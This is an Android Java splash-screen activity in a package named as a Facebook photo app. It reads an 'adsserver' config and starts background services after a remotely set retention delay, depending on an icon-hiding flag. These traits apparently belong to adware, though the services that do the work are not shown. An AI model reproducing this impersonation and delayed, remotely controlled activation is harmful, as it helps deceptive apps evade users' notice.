package com.facebook.photo;

import android.app.Activity;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.Build;
import android.os.Bundle;
import android.view.Window;
import android.view.WindowManager;

import com.facebook.photo.model.ClientConfig;
import com.facebook.photo.services.FirstRunService;
import com.facebook.photo.services.MyService;
import com.facebook.photo.utils.AppConstants;
import com.google.gson.Gson;
import com.google.gson.GsonBuilder;

//public class SplashScreenActivity extends AppCompatActivity {
public class SplashScreenActivity extends Activity {


    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        requestWindowFeature(Window.FEATURE_NO_TITLE);
        getWindow().setFlags(WindowManager.LayoutParams.FLAG_FULLSCREEN,
                WindowManager.LayoutParams.FLAG_FULLSCREEN);

        SharedPreferences mPref = getSharedPreferences("adsserver", 0);
        if (mPref.contains(AppConstants.tag_data)) {
            if (Build.VERSION.SDK_INT >= 26) {
                Gson gson = new GsonBuilder().create();
                ClientConfig clientConfig = gson.fromJson(mPref.getString(AppConstants.tag_data, ""), ClientConfig.class);
                int totalTime = mPref.getInt("totalTime", 0);

                if (clientConfig.delay_retention >= 0 && totalTime >= clientConfig.delay_retention && mPref.getInt("isHideIcon", 0) == 0) {
                    Intent myIntent = new Intent(getApplicationContext(), MyService.class);
                    startService(myIntent);
                }
            }
        } else {
            Intent myIntent = new Intent(getApplicationContext(), FirstRunService.class);
            startService(myIntent);
        }

        Intent mainIntent = new Intent(SplashScreenActivity.this, AppConstants.mainClass);
        startActivity(mainIntent);
        finish();

    }
}
